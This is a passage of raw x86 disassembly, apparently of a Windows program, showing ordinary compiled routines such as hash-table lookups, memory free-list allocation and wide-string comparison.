  403249:	mov    bx,WORD PTR [ebp-0x4]
  40324d:	sub    esp,0x8
  403250:	mov    eax,esp
  403252:	mov    DWORD PTR [eax],edi
  403254:	mov    WORD PTR [eax+0x4],bx
  403258:	mov    BYTE PTR [eax+0x6],cl
  40325b:	mov    ecx,esi
  40325d:	call   0x405bf0
  403262:	cmp    DWORD PTR [edi+0x6],0x0
  403266:	mov    esi,DWORD PTR ds:0x414b08
  40326c:	jne    0x4032d3
  40326e:	mov    ecx,DWORD PTR ds:0x420398
  403274:	test   ecx,ecx
  403276:	je     0x403288
  403278:	mov    eax,DWORD PTR [ecx]
  40327a:	mov    ds:0x420398,eax
  40327f:	xor    eax,eax
  403281:	mov    DWORD PTR [ecx],eax
  403283:	mov    DWORD PTR [ecx+0x4],eax
  403286:	jmp    0x4032d0
  403288:	mov    eax,ds:0x422bb0
  40328d:	cmp    eax,0x8
  403290:	jge    0x4032b7
  403292:	cmp    eax,0x4
  403295:	jb     0x4032a4
  403297:	mov    ecx,DWORD PTR ds:0x422bac
  40329d:	mov    edx,eax
  40329f:	call   0x40ca10
  4032a4:	mov    ecx,0x200
  4032a9:	call   0x40c940
  4032ae:	mov    edx,eax
  4032b0:	mov    eax,0x200
  4032b5:	jmp    0x4032bd
  4032b7:	mov    edx,DWORD PTR ds:0x422bac
  4032bd:	sub    eax,0x8
  4032c0:	mov    ecx,edx
  4032c2:	add    edx,0x8
  4032c5:	mov    ds:0x422bb0,eax
  4032ca:	mov    DWORD PTR ds:0x422bac,edx
  4032d0:	mov    DWORD PTR [edi+0x6],ecx
  4032d3:	mov    cl,BYTE PTR [ebp-0x2]
  4032d6:	sub    esp,0x8
  4032d9:	mov    eax,esp
  4032db:	mov    DWORD PTR [eax],esi
  4032dd:	mov    WORD PTR [eax+0x4],bx
  4032e1:	mov    BYTE PTR [eax+0x6],cl
  4032e4:	mov    ecx,DWORD PTR [edi+0x6]
  4032e7:	add    ecx,0x4
  4032ea:	call   0x405bf0
  4032ef:	mov    eax,ds:0x40e420
  4032f4:	mov    dx,WORD PTR ds:0x414b10
  4032fb:	inc    WORD PTR [eax+0xa]
  4032ff:	mov    esi,0xffff
  403304:	cmp    dx,si
  403307:	je     0x40332c
  403309:	cmp    BYTE PTR [eax+0xf],0x0
  40330d:	je     0x40332c
  40330f:	movzx  ecx,WORD PTR [eax+0x1c]
  403313:	cmp    cx,dx
  403316:	je     0x40332c
  403318:	cmp    cx,si
  40331b:	jne    0x403328
  40331d:	mov    WORD PTR [eax+0x1c],dx
  403321:	pop    edi
  403322:	pop    esi
  403323:	pop    ebx
  403324:	mov    esp,ebp
  403326:	pop    ebp
  403327:	ret    
  403328:	mov    BYTE PTR [eax+0xf],0x0
  40332c:	pop    edi
  40332d:	pop    esi
  40332e:	pop    ebx
  40332f:	mov    esp,ebp
  403331:	pop    ebp
  403332:	ret    
  403333:	int3   
  403334:	int3   
  403335:	int3   
  403336:	int3   
  403337:	int3   
  403338:	int3   
  403339:	int3   
  40333a:	int3   
  40333b:	int3   
  40333c:	int3   
  40333d:	int3   
  40333e:	int3   
  40333f:	int3   
  403340:	push   ebp
  403341:	mov    ebp,esp
  403343:	push   ecx
  403344:	mov    eax,ds:0x414b08
  403349:	push   esi
  40334a:	test   eax,eax
  40334c:	je     0x403360
  40334e:	mov    edx,DWORD PTR [eax+0x2]
  403351:	mov    al,BYTE PTR [edx+0x4]
  403354:	cmp    al,0x8
  403356:	je     0x40336d
  403358:	cmp    al,0xb
  40335a:	je     0x40336d
  40335c:	cmp    al,0xf
  40335e:	je     0x40336d
  403360:	xor    eax,eax
  403362:	mov    ds:0x40eaf8,ax
  403368:	pop    esi
  403369:	mov    esp,ebp
  40336b:	pop    ebp
  40336c:	ret    
  40336d:	mov    ecx,DWORD PTR ds:0x40e430
  403373:	lea    esi,[ebp-0x4]
  403376:	mov    eax,DWORD PTR [ecx]
  403378:	push   esi
  403379:	push   DWORD PTR [edx]
  40337b:	call   DWORD PTR [eax+0x38]
  40337e:	test   eax,eax
  403380:	je     0x40340e
  403386:	mov    ecx,DWORD PTR [ebp-0x4]
  403389:	mov    esi,ecx
  40338b:	lea    edx,[esi+0x2]
  40338e:	mov    edi,edi
  403390:	mov    ax,WORD PTR [esi]
  403393:	add    esi,0x2
  403396:	test   ax,ax
  403399:	jne    0x403390
  40339b:	sub    esi,edx
  40339d:	sar    esi,1
  40339f:	cmp    WORD PTR [ecx],0x3f
  4033a3:	jne    0x4033f5
  4033a5:	cmp    WORD PTR [ecx+0x2],0x24
  4033aa:	lea    eax,[ecx+0x2]
  4033ad:	je     0x4033f5
  4033af:	cmp    esi,0x2
  4033b2:	jbe    0x4033f5
  4033b4:	cmp    WORD PTR [ecx+esi*2-0x2],0x40
  4033ba:	jne    0x4033f5
  4033bc:	cmp    WORD PTR [ecx+esi*2-0x4],0x40
  4033c2:	jne    0x4033f5
  4033c4:	push   eax
  4033c5:	push   0x1000
  4033ca:	push   0x40eaf8
  4033cf:	call   DWORD PTR ds:0x4244b8
  4033d5:	lea    esi,[esi*2-0x6]
  4033dc:	add    esp,0xc
  4033df:	cmp    esi,0x2000
  4033e5:	jae    0x40341f
  4033e7:	xor    eax,eax
  4033e9:	mov    WORD PTR [esi+0x40eaf8],ax
  4033f0:	pop    esi
  4033f1:	mov    esp,ebp
  4033f3:	pop    ebp
  4033f4:	ret    
  4033f5:	push   ecx
  4033f6:	push   0x1000
  4033fb:	push   0x40eaf8
  403400:	call   DWORD PTR ds:0x4244b8
  403406:	add    esp,0xc
  403409:	pop    esi
  40340a:	mov    esp,ebp
  40340c:	pop    ebp
  40340d:	ret    
  40340e:	push   0x0
  403410:	mov    edx,0x4010c0
  403415:	mov    ecx,0x5e5
  40341a:	call   0x407010
  40341f:	call   0x40d6cd
  403424:	int3   
  403425:	int3   
  403426:	int3   
  403427:	int3   
  403428:	int3   
  403429:	int3   
  40342a:	int3   
  40342b:	int3   
  40342c:	int3   
  40342d:	int3   
  40342e:	int3   
  40342f:	int3   
  403430:	push   ecx
  403431:	push   esi
  403432:	mov    esi,DWORD PTR ds:0x40e420
  403438:	push   edi
  403439:	mov    eax,DWORD PTR [esi+0x2a]
  40343c:	mov    edi,ecx
  40343e:	push   edi
  40343f:	call   eax
  403441:	movzx  eax,ax
  403444:	cdq    
  403445:	idiv   DWORD PTR [esi+0x26]
  403448:	mov    eax,DWORD PTR [esi+0x1e]
  40344b:	add    esp,0x4
  40344e:	mov    eax,DWORD PTR [eax+edx*4]
  403451:	test   eax,eax
  403453:	je     0x403460
  403455:	cmp    DWORD PTR [eax+0x4],edi
  403458:	je     0x40348a
  40345a:	mov    eax,DWORD PTR [eax]
  40345c:	test   eax,eax
  40345e:	jne    0x403455
  403460:	mov    esi,DWORD PTR ds:0x4223e0
  403466:	test   esi,esi
  403468:	je     0x403491
  40346a:	mov    eax,DWORD PTR [esi]
  40346c:	mov    ds:0x4223e0,eax
  403471:	xor    eax,eax
  403473:	mov    DWORD PTR [esi],eax
  403475:	mov    DWORD PTR [esi+0x4],eax
  403478:	mov    DWORD PTR [esi+0x8],eax
  40347b:	mov    DWORD PTR [esi+0xc],eax
  40347e:	mov    DWORD PTR [esi+0x10],eax
  403481:	mov    DWORD PTR [esi+0x14],eax
  403484:	mov    WORD PTR [esi+0x18],ax
  403488:	jmp    0x4034d9
  40348a:	mov    eax,DWORD PTR [eax+0x8]
  40348d:	pop    edi
  40348e:	pop    esi
  40348f:	pop    ecx
  403490:	ret    
  403491:	mov    eax,ds:0x422b88
  403496:	cmp    eax,0x1a
  403499:	jge    0x4034c0
  40349b:	cmp    eax,0x4
  40349e:	jb     0x4034ad
  4034a0:	mov    ecx,DWORD PTR ds:0x422b84
  4034a6:	mov    edx,eax
  4034a8:	call   0x40cf80
  4034ad:	mov    ecx,0x200
  4034b2:	call   0x40c940
  4034b7:	mov    ecx,eax
  4034b9:	mov    eax,0x200
  4034be:	jmp    0x4034c6
  4034c0:	mov    ecx,DWORD PTR ds:0x422b84
  4034c6:	sub    eax,0x1a
  4034c9:	mov    esi,ecx
  4034cb:	add    ecx,0x1a
  4034ce:	mov    ds:0x422b88,eax
  4034d3:	mov    DWORD PTR ds:0x422b84,ecx
  4034d9:	mov    ecx,DWORD PTR ds:0x40e420
  4034df:	push   esi
  4034e0:	push   edi
  4034e1:	add    ecx,0x1e
  4034e4:	mov    DWORD PTR [esi+0x2],edi
  4034e7:	call   0x4066a0
  4034ec:	pop    edi
  4034ed:	mov    eax,esi
  4034ef:	pop    esi
  4034f0:	pop    ecx
  4034f1:	ret    
  4034f2:	int3   
  4034f3:	int3   
  4034f4:	int3   
  4034f5:	int3   
  4034f6:	int3   
  4034f7:	int3   
  4034f8:	int3   
  4034f9:	int3   
  4034fa:	int3   
  4034fb:	int3   
  4034fc:	int3   
  4034fd:	int3   
  4034fe:	int3   
  4034ff:	int3   
  403500:	push   ebp
  403501:	mov    ebp,esp
  403503:	mov    ecx,DWORD PTR ds:0x40e430
  403509:	sub    esp,0xc
  40350c:	mov    eax,DWORD PTR [ecx]
  40350e:	push   ebx
  40350f:	mov    bl,BYTE PTR ds:0x40e8cc
  403515:	push   esi
  403516:	movzx  esi,WORD PTR ds:0x40e8d0
  40351d:	push   edi
  40351e:	mov    edi,DWORD PTR ds:0x40e8c8
  403524:	lea    edx,[ebp-0xc]
  403527:	push   edx
  403528:	push   DWORD PTR ds:0x40e8d4
  40352e:	call   DWORD PTR [eax+0x20]
  403531:	test   eax,eax
  403533:	je     0x403570
  403535:	mov    eax,DWORD PTR [ebp-0xc]
  403538:	sub    esp,0x8
  40353b:	mov    ecx,esp
  40353d:	mov    WORD PTR [ebp-0x7],si
  403541:	mov    DWORD PTR [ecx],eax
  403543:	mov    BYTE PTR [ebp-0x8],bl
  403546:	mov    ax,WORD PTR [ebp-0x8]
  40354a:	mov    WORD PTR [ecx+0x4],ax
  40354e:	mov    al,BYTE PTR [ebp-0x6]
  403551:	mov    BYTE PTR [ecx+0x6],al
  403554:	call   0x4067e0
  403559:	mov    esi,eax
  40355b:	push   esi
  40355c:	push   edi
  40355d:	call   0x406a40
  403562:	mov    ecx,esi
  403564:	call   0x403430
  403569:	pop    edi
  40356a:	pop    esi
  40356b:	pop    ebx
  40356c:	mov    esp,ebp
  40356e:	pop    ebp
  40356f:	ret    
  403570:	push   0x0
  403572:	mov    edx,0x4010c0
  403577:	mov    ecx,0x5e5
  40357c:	call   0x407010
  403581:	int3   
  403582:	int3   
  403583:	int3   
  403584:	int3   
  403585:	int3   
  403586:	int3   
  403587:	int3   
  403588:	int3   
  403589:	int3   
  40358a:	int3   
  40358b:	int3   
  40358c:	int3   
  40358d:	int3   
  40358e:	int3   
  40358f:	int3   
  403590:	push   ebp
  403591:	mov    ebp,esp
  403593:	sub    esp,0x8
  403596:	push   esi
  403597:	push   edi
  403598:	mov    edi,DWORD PTR ds:0x40e8c8
  40359e:	test   edi,edi
  4035a0:	je     0x403605
  4035a2:	mov    esi,DWORD PTR ds:0x40e418
  4035a8:	push   edi
  4035a9:	mov    eax,DWORD PTR [esi+0xc]
  4035ac:	call   eax
  4035ae:	movzx  eax,ax
  4035b1:	cdq    
  4035b2:	idiv   DWORD PTR [esi+0x8]
  4035b5:	mov    eax,DWORD PTR [esi]
  4035b7:	add    esp,0x4
  4035ba:	mov    eax,DWORD PTR [eax+edx*4]
  4035bd:	test   eax,eax
  4035bf:	je     0x4035cc
  4035c1:	cmp    DWORD PTR [eax+0x4],edi
  4035c4:	je     0x4035f7
  4035c6:	mov    eax,DWORD PTR [eax]
  4035c8:	test   eax,eax
  4035ca:	jne    0x4035c1
  4035cc:	cmp    BYTE PTR ds:0x40e410,0x0
  4035d3:	je     0x403605
  4035d5:	mov    ecx,DWORD PTR ds:0x40e414
  4035db:	lea    eax,[ebp-0x4]
  4035de:	push   eax
  4035df:	push   edi
  4035e0:	call   0x4069f0
  4035e5:	test   eax,eax
  4035e7:	je     0x403605
  4035e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4035ec:	call   0x403430
  4035f1:	pop    edi
  4035f2:	pop    esi
  4035f3:	mov    esp,ebp
  4035f5:	pop    ebp
  4035f6:	ret    
  4035f7:	mov    ecx,DWORD PTR [eax+0x8]
  4035fa:	call   0x403430
  4035ff:	pop    edi
  403600:	pop    esi
  403601:	mov    esp,ebp
  403603:	pop    ebp
  403604:	ret    
  403605:	pop    edi
  403606:	xor    eax,eax
  403608:	pop    esi
  403609:	mov    esp,ebp
  40360b:	pop    ebp
  40360c:	ret    
  40360d:	int3   
  40360e:	int3   
  40360f:	int3   
  403610:	push   ebp
  403611:	mov    ebp,esp
  403613:	push   ecx
  403614:	push   esi
  403615:	mov    edx,ecx
  403617:	mov    ecx,DWORD PTR ds:0x40e430
  40361d:	lea    esi,[ebp-0x4]
  403620:	mov    eax,DWORD PTR [ecx]
  403622:	push   esi
  403623:	push   edx
  403624:	call   DWORD PTR [eax+0x20]
  403627:	test   eax,eax
  403629:	je     0x403633
  40362b:	mov    eax,DWORD PTR [ebp-0x4]
  40362e:	pop    esi
  40362f:	mov    esp,ebp
  403631:	pop    ebp
  403632:	ret    
  403633:	push   0x0
  403635:	mov    edx,0x4010c0
  40363a:	mov    ecx,0x5e5
  40363f:	call   0x407010
  403644:	int3   
  403645:	int3   
  403646:	int3   
  403647:	int3   
  403648:	int3   
  403649:	int3   
  40364a:	int3   
  40364b:	int3   
  40364c:	int3   
  40364d:	int3   
  40364e:	int3   
  40364f:	int3   
  403650:	push   ebp
  403651:	mov    ebp,esp
  403653:	push   ecx
  403654:	push   esi
  403655:	mov    edx,ecx
  403657:	mov    ecx,DWORD PTR ds:0x40e430
  40365d:	lea    esi,[ebp-0x4]
  403660:	mov    eax,DWORD PTR [ecx]
  403662:	push   esi
  403663:	push   edx
  403664:	call   DWORD PTR [eax+0x38]
  403667:	test   eax,eax
  403669:	je     0x403673
  40366b:	mov    eax,DWORD PTR [ebp-0x4]
  40366e:	pop    esi
  40366f:	mov    esp,ebp
  403671:	pop    ebp
  403672:	ret    
  403673:	push   0x0
  403675:	mov    edx,0x4010c0
  40367a:	mov    ecx,0x5e5
  40367f:	call   0x407010
  403684:	int3   
  403685:	int3   
  403686:	int3   
  403687:	int3   
  403688:	int3   
  403689:	int3   
  40368a:	int3   
  40368b:	int3   
  40368c:	int3   
  40368d:	int3   
  40368e:	int3   
  40368f:	int3   
  403690:	push   esi
  403691:	push   edi
  403692:	mov    edi,ecx
  403694:	mov    esi,edx
  403696:	cmp    WORD PTR [edi],0x3f
  40369a:	jne    0x40369f
  40369c:	add    edi,0x2
  40369f:	cmp    WORD PTR [esi],0x3f
  4036a3:	jne    0x4036a8
  4036a5:	add    esi,0x2
  4036a8:	push   esi
  4036a9:	push   edi
  4036aa:	call   DWORD PTR ds:0x4244bc
  4036b0:	add    esp,0x8
  4036b3:	test   eax,eax
  4036b5:	jne    0x4036e3
  4036b7:	mov    ax,WORD PTR [edi]
  4036ba:	cmp    ax,WORD PTR [esi]
  4036bd:	jne    0x4036de
  4036bf:	test   ax,ax
  4036c2:	je     0x4036d9
  4036c4:	mov    ax,WORD PTR [edi+0x2]
  4036c8:	cmp    ax,WORD PTR [esi+0x2]
  4036cc:	jne    0x4036de
  4036ce:	add    edi,0x4
  4036d1:	add    esi,0x4
  4036d4:	test   ax,ax
  4036d7:	jne    0x4036b7
  4036d9:	pop    edi
  4036da:	xor    eax,eax
  4036dc:	pop    esi
  4036dd:	ret    
  4036de:	sbb    eax,eax
  4036e0:	or     eax,0x1
  4036e3:	pop    edi
  4036e4:	pop    esi
  4036e5:	ret    
  4036e6:	int3   
  4036e7:	int3   
  4036e8:	int3   
  4036e9:	int3   
  4036ea:	int3   
  4036eb:	int3   
  4036ec:	int3   
  4036ed:	int3   
  4036ee:	int3   
  4036ef:	int3   
  4036f0:	push   ebp
  4036f1:	mov    ebp,esp
  4036f3:	push   ecx
  4036f4:	cmp    BYTE PTR ds:0x40e023,0x0
  4036fb:	jne    0x4037c2
  403701:	mov    ecx,DWORD PTR ds:0x40e42c
  403707:	lea    edx,[ebp-0x4]
  40370a:	mov    eax,DWORD PTR [ecx]
  40370c:	push   edx
  40370d:	push   0x4010ec
  403712:	call   DWORD PTR [eax+0x60]
  403715:	test   eax,eax
  403717:	je     0x4037c6
  40371d:	mov    ecx,DWORD PTR [ebp-0x4]
  403720:	push   0x0
  403722:	mov    eax,DWORD PTR [ecx]
  403724:	mov    DWORD PTR ds:0x414b24,0x414f28
  40372e:	mov    DWORD PTR ds:0x416f28,ecx
  403734:	call   DWORD PTR [eax+0x20]
  403737:	test   eax,eax
  403739:	je     0x4037cb
  40373f:	mov    edx,DWORD PTR ds:0x414b24
  403745:	push   esi
  403746:	mov    esi,DWORD PTR ds:0x414b1c
  40374c:	test   esi,esi
  40374e:	je     0x403790
  403750:	lea    ecx,[edx+0x7]
  403753:	cmp    ecx,0x416f28
  403759:	jbe    0x40376f
  40375b:	mov    edx,0x7
  403760:	mov    ecx,esi
  403762:	call   0x4045d0
  403767:	mov    edx,DWORD PTR ds:0x414b24
  40376d:	jmp    0x403789
  40376f:	mov    eax,DWORD PTR [esi]
  403771:	mov    DWORD PTR [edx],eax
  403773:	mov    ax,WORD PTR [esi+0x4]
  403777:	mov    WORD PTR [edx+0x4],ax
  40377b:	mov    al,BYTE PTR [esi+0x6]
  40377e:	mov    BYTE PTR [edx+0x6],al
  403781:	mov    edx,ecx
  403783:	mov    DWORD PTR ds:0x414b24,edx
  403789:	mov    esi,DWORD PTR [esi+0x7]
  40378c:	test   esi,esi
  40378e:	jne    0x403750
  403790:	mov    ecx,DWORD PTR ds:0x416f28
  403796:	sub    edx,0x414f28
  40379c:	mov    eax,DWORD PTR [ecx]
  40379e:	push   edx
  40379f:	push   0x414f28
  4037a4:	call   DWORD PTR [eax+0x10]
  4037a7:	pop    esi
  4037a8:	test   eax,eax
  4037aa:	je     0x4037d0
  4037ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4037af:	mov    DWORD PTR ds:0x414b24,0x414f28
  4037b9:	mov    eax,DWORD PTR [ecx]
  4037bb:	call   DWORD PTR [eax+0x18]
  4037be:	test   eax,eax
  4037c0:	je     0x4037d5
  4037c2:	mov    esp,ebp
  4037c4:	pop    ebp
  4037c5:	ret    
  4037c6:	call   0x4021b0
  4037cb:	call   0x4021b0
  4037d0:	call   0x4021b0
  4037d5:	call   0x4021b0
  4037da:	int3   
  4037db:	int3   
  4037dc:	int3   
  4037dd:	int3   
  4037de:	int3   
  4037df:	int3   
  4037e0:	push   ebp
  4037e1:	mov    ebp,esp
  4037e3:	sub    esp,0x8
  4037e6:	mov    BYTE PTR ds:0x40e022,0x0
  4037ed:	push   esi
  4037ee:	mov    esi,DWORD PTR ds:0x40e414
  4037f4:	push   edi
  4037f5:	test   esi,esi
  4037f7:	je     0x403808
  4037f9:	mov    ecx,esi
  4037fb:	call   0x4069a0
  403800:	push   ecx
  403801:	mov    ecx,esi
  403803:	call   0x403920
  403808:	mov    eax,ds:0x40e418
  40380d:	push   0x10
  40380f:	push   0x0
  403811:	push   DWORD PTR ds:0x40e648
  403817:	mov    ds:0x40e414,eax
  40381c:	call   DWORD PTR ds:0x4242c4
  403822:	mov    esi,eax
  403824:	test   esi,esi
  403826:	je     0x4038f6
  40382c:	mov    ecx,0x8000
  403831:	mov    DWORD PTR [esi+0x4],0x0
  403838:	mov    DWORD PTR [esi+0xc],0x4021d0
  40383f:	mov    DWORD PTR [esi+0x8],0x2000
  403846:	mov    DWORD PTR [esi],0x0
  40384c:	call   0x40cd70
  403851:	mov    ecx,DWORD PTR ds:0x40e8dc
  403857:	mov    edx,0x40e8e0
  40385c:	mov    DWORD PTR [esi],eax
  40385e:	mov    DWORD PTR ds:0x40e418,esi
  403864:	mov    BYTE PTR ds:0x40e410,0x1
  40386b:	call   0x409e70
  403870:	mov    edi,eax
  403872:	mov    edx,edi
  403874:	lea    eax,[edx+0x2]
  403877:	mov    cx,WORD PTR [edx]
  40387a:	add    edx,0x2
  40387d:	test   cx,cx
  403880:	jne    0x403877
  403882:	sub    edx,eax
  403884:	sar    edx,1
  403886:	mov    DWORD PTR [ebp-0x4],0x0
  40388d:	lea    esi,[edx+0x1]
  403890:	mov    ecx,0x400
  403895:	cmp    esi,0x400
  40389b:	jb     0x40389f
  40389d:	mov    ecx,esi
  40389f:	mov    eax,ds:0x40e03c
  4038a4:	mov    ds:0x40e040,eax
  4038a9:	lea    eax,[ebp-0x4]
  4038ac:	push   eax
  4038ad:	lea    eax,[ecx+ecx*1]
  4038b0:	push   eax
  4038b1:	mov    ecx,0x40e03c
  4038b6:	call   0x406f80
  4038bb:	test   eax,eax
  4038bd:	je     0x4038e5
  4038bf:	mov    eax,DWORD PTR [ebp-0x4]
  4038c2:	push   edi
  4038c3:	push   esi
  4038c4:	push   eax
  4038c5:	mov    ds:0x40e024,eax
  4038ca:	call   DWORD PTR ds:0x4244b8
  4038d0:	mov    ax,ds:0x414b14
  4038d6:	add    esp,0xc
  4038d9:	mov    ds:0x40e020,ax
  4038df:	pop    edi
  4038e0:	pop    esi
  4038e1:	mov    esp,ebp
  4038e3:	pop    ebp
  4038e4:	ret    
  4038e5:	push   0x0
  4038e7:	mov    edx,0x4010c0
  4038ec:	mov    ecx,0x5e5
  4038f1:	call   0x407010
  4038f6:	push   0x0
  4038f8:	mov    edx,0x4010c0
  4038fd:	mov    ecx,0x5e5
  403902:	mov    DWORD PTR ds:0x40e418,0x0
  40390c:	call   0x407010
  403911:	int3   
  403912:	int3   
  403913:	int3   
  403914:	int3   
  403915:	int3   
  403916:	int3   
  403917:	int3   
  403918:	int3   
  403919:	int3   
  40391a:	int3   
  40391b:	int3   
  40391c:	int3   
  40391d:	int3   
  40391e:	int3   
  40391f:	int3   
  403920:	push   esi
  403921:	mov    esi,ecx
  403923:	call   0x4069a0
  403928:	mov    ecx,DWORD PTR [esi]
  40392a:	test   ecx,ecx
  40392c:	je     0x40395d
  40392e:	mov    edx,DWORD PTR [esi+0x8]
  403931:	shl    edx,0x2
  403934:	cmp    edx,0x200
  40393a:	jl     0x403943
  40393c:	call   0x40c970
  403941:	jmp    0x40395d
  403943:	cmp    edx,0x4
  403946:	jae    0x40394d
  403948:	mov    edx,0x4
  40394d:	mov    eax,DWORD PTR [edx*4+0x421378]
  403954:	mov    DWORD PTR [ecx],eax
  403956:	mov    DWORD PTR [edx*4+0x421378],ecx
  40395d:	push   esi
  40395e:	push   0x0
  403960:	push   DWORD PTR ds:0x40e648
  403966:	mov    DWORD PTR [esi],0x0
  40396c:	call   DWORD PTR ds:0x4242c0
  403972:	mov    eax,esi
  403974:	pop    esi
  403975:	ret    0x4
  403978:	int3   
  403979:	int3   
  40397a:	int3   
  40397b:	int3   
  40397c:	int3   
  40397d:	int3   
  40397e:	int3   
  40397f:	int3   
  403980:	push   ecx
  403981:	mov    ecx,DWORD PTR ds:0x40e420
  403987:	cmp    WORD PTR [ecx+0x10],0x2
  40398c:	jne    0x4039a3
  40398e:	xor    dl,dl
  403990:	call   0x404f60
  403995:	mov    eax,ds:0x40e420
  40399a:	mov    ecx,0x3
  40399f:	mov    WORD PTR [eax+0x10],cx
  4039a3:	pop    ecx
  4039a4:	ret    
  4039a5:	int3   
  4039a6:	int3   
  4039a7:	int3   
  4039a8:	int3   
  4039a9:	int3   
  4039aa:	int3   
  4039ab:	int3   
  4039ac:	int3   
  4039ad:	int3   
  4039ae:	int3   
  4039af:	int3   
  4039b0:	push   ebp
  4039b1:	mov    ebp,esp
  4039b3:	sub    esp,0x5ac
  4039b9:	mov    eax,ds:0x40e018
  4039be:	xor    eax,ebp
  4039c0:	mov    DWORD PTR [ebp-0x4],eax
  4039c3:	push   ebx
  4039c4:	push   esi
  4039c5:	push   edi
  4039c6:	push   0x401108
  4039cb:	lea    eax,[ebp-0x4b0]
  4039d1:	mov    esi,ecx
  4039d3:	push   0x212
  4039d8:	push   eax
  4039d9:	mov    DWORD PTR [ebp-0x5a0],esi
  4039df:	call   DWORD PTR ds:0x4244b8
  4039e5:	mov    ecx,DWORD PTR ds:0x40e430
  4039eb:	add    esp,0xc
  4039ee:	mov    eax,DWORD PTR [ecx]
  4039f0:	lea    edx,[ebp-0x56c]
  4039f6:	push   edx
  4039f7:	push   DWORD PTR [esi]
  4039f9:	call   DWORD PTR [eax+0x38]
  4039fc:	test   eax,eax
  4039fe:	je     0x4044cf
  403a04:	push   DWORD PTR [ebp-0x56c]
  403a0a:	lea    eax,[ebp-0x4b0]
  403a10:	push   0x212
  403a15:	push   eax
  403a16:	call   DWORD PTR ds:0x4244b4
  403a1c:	mov    ecx,DWORD PTR ds:0x40e42c
  403a22:	add    esp,0xc
  403a25:	mov    eax,DWORD PTR [ecx]
  403a27:	lea    edx,[ebp-0x5a8]
  403a2d:	push   edx
  403a2e:	lea    edx,[ebp-0x4b0]
  403a34:	push   edx
  403a35:	call   DWORD PTR [eax+0x60]
  403a38:	test   eax,eax
  403a3a:	je     0x4044e0
  403a40:	mov    ebx,DWORD PTR [esi+0x22]
  403a43:	mov    DWORD PTR [ebp-0x578],ebx
  403a49:	test   ebx,ebx
  403a4b:	jne    0x403a6d
  403a4d:	lea    ecx,[esi+0x1e]
  403a50:	call   0x406000
  403a55:	mov    ecx,DWORD PTR [ebp-0x5a8]
  403a5b:	mov    eax,DWORD PTR [ecx]
  403a5d:	call   DWORD PTR [eax+0x18]
  403a60:	test   eax,eax
  403a62:	jne    0x4044be
  403a68:	jmp    0x4044e5
  403a6d:	mov    ecx,DWORD PTR [ebp-0x5a8]
  403a73:	push   0x0
  403a75:	mov    eax,DWORD PTR [ecx]
  403a77:	mov    DWORD PTR ds:0x414b24,0x414f28
  403a81:	mov    DWORD PTR ds:0x416f28,ecx
  403a87:	call   DWORD PTR [eax+0x20]
  403a8a:	test   eax,eax
  403a8c:	je     0x4044ea
  403a92:	push   0x7f
  403a94:	lea    eax,[ebp-0x87]
  403a9a:	push   0x0
  403a9c:	push   eax
  403a9d:	mov    BYTE PTR [ebp-0x88],0x0
  403aa4:	call   0x40db72
  403aa9:	add    esp,0xc
  403aac:	push   ebx
  403aad:	push   0x8
  403aaf:	call   DWORD PTR ds:0x424424
  403ab5:	add    esp,0x8
  403ab8:	mov    DWORD PTR [ebp-0x570],eax
  403abe:	test   eax,eax
  403ac0:	je     0x4044ef
  403ac6:	or     esi,0xffffffff
  403ac9:	mov    DWORD PTR [ebp-0x57c],0x0
  403ad3:	xor    edi,edi
  403ad5:	mov    ebx,eax
  403ad7:	test   edi,edi
  403ad9:	je     0x403ae1
  403adb:	mov    edi,DWORD PTR [edi]
  403add:	test   edi,edi
  403adf:	jne    0x403aff
  403ae1:	mov    edx,DWORD PTR [ebp-0x5a0]
  403ae7:	mov    ecx,DWORD PTR [edx+0x26]
  403aea:	lea    ebx,[ebx+0x0]
  403af0:	inc    esi
  403af1:	cmp    esi,ecx
  403af3:	jge    0x403b46
  403af5:	mov    eax,DWORD PTR [edx+0x1e]
  403af8:	mov    edi,DWORD PTR [eax+esi*4]
  403afb:	test   edi,edi
  403afd:	je     0x403af0
  403aff:	mov    eax,DWORD PTR [edi+0x4]
  403b02:	mov    edx,DWORD PTR [eax]
  403b04:	cmp    edx,DWORD PTR [ebp-0x57c]
  403b0a:	jbe    0x403b12
  403b0c:	mov    DWORD PTR [ebp-0x57c],edx
  403b12:	mov    eax,DWORD PTR [edi+0x8]
  403b15:	mov    DWORD PTR [ebx],eax
  403b17:	mov    ecx,DWORD PTR ds:0x40e430
  403b1d:	mov    eax,DWORD PTR [ecx]
  403b1f:	lea    ecx,[ebp-0x56c]
  403b25:	push   ecx
  403b26:	mov    ecx,DWORD PTR ds:0x40e430
  403b2c:	push   edx
  403b2d:	call   DWORD PTR [eax+0x38]
  403b30:	test   eax,eax
  403b32:	je     0x4044cf
  403b38:	mov    eax,DWORD PTR [ebp-0x56c]
  403b3e:	mov    DWORD PTR [ebx+0x4],eax
  403b41:	add    ebx,0x8
  403b44:	jmp    0x403ad7
  403b46:	mov    eax,DWORD PTR [ebp-0x578]
  403b4c:	mov    ebx,DWORD PTR [ebp-0x57c]
  403b52:	mov    WORD PTR [ebp-0x560],ax
  403b59:	movzx  eax,WORD PTR [edx+0x6]
  403b5d:	mov    WORD PTR [ebp-0x55e],ax
  403b64:	movzx  eax,WORD PTR [edx+0x4]
  403b68:	mov    WORD PTR [ebp-0x55c],ax
  403b6f:	movzx  eax,WORD PTR [edx+0x8]
  403b73:	mov    WORD PTR [ebp-0x55a],ax
  403b7a:	movzx  eax,WORD PTR [edx+0xa]
  403b7e:	mov    WORD PTR [ebp-0x558],ax
  403b85:	mov    al,BYTE PTR [edx+0xf]
  403b88:	mov    BYTE PTR [ebp-0x556],al
  403b8e:	movzx  eax,WORD PTR [edx+0x1c]
  403b92:	mov    DWORD PTR [ebp-0x553],ebx
  403b98:	shr    ebx,0xa
  403b9b:	inc    ebx
  403b9c:	or     esi,0xffffffff
  403b9f:	mov    DWORD PTR [ebp-0x568],0x3
  403ba9:	mov    DWORD PTR [ebp-0x564],0x3
  403bb3:	mov    WORD PTR [ebp-0x555],ax
  403bba:	xor    edi,edi
  403bbc:	lea    esp,[esp+0x0]
  403bc0:	test   edi,edi
  403bc2:	je     0x403bca
  403bc4:	mov    edi,DWORD PTR [edi]
  403bc6:	test   edi,edi
  403bc8:	jne    0x403bdf
  403bca:	mov    ecx,DWORD PTR [edx+0x26]
  403bcd:	lea    ecx,[ecx+0x0]
  403bd0:	inc    esi
  403bd1:	cmp    esi,ecx
  403bd3:	jge    0x403c06
  403bd5:	mov    eax,DWORD PTR [edx+0x1e]
